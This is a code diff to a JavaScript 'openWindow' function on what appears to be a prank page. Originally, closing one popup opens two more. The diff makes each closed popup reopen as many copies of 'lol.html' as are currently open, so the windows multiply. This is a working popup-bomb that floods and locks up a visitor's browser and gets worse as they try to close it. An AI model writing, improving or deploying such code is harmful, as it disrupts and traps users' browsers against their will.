@@ -56,12 +56,20 @@ function openWindow(url) {
     var aWindow = window.open(url, "_blank", "menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes");
     if (aWindow) {
         openWindows.push(aWindow);
-        // Check if window is closed, then open 2 more
+
+        // Monitor for closure
         var timer = setInterval(function() {
+            // Remove closed windows from the array
+            openWindows = openWindows.filter(w => !w.closed);
+
             if (aWindow.closed) {
                 clearInterval(timer);
-                openWindows = openWindows.filter(w => !w.closed);
-                for (var i = 0; i < 2; i++) openWindow('lol.html');
+
+                // Duplicate all currently open popups
+                var countToOpen = Math.max(1, openWindows.length); // Ensure at least 1
+                for (var i = 0; i < countToOpen; i++) {
+                    openWindow('lol.html');
+                }
             }
         }, 500);
     }
